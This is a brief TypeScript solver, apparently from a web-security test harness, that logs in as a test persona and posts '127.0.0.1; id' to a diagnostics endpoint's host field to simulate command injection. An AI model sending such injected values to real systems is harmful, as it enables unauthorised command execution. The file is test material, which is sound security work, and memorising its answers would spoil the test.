// Simulated command injection: append a second command to the diagnostics host argument.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const hostField = ctx.plan.params.host ?? 'host'
  const body: Record<string, string> = {}
  body[hostField] = '127.0.0.1; id'
  await ctx.fetch(ctx.plan.routes.diagRun!.path, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body),
  })
}
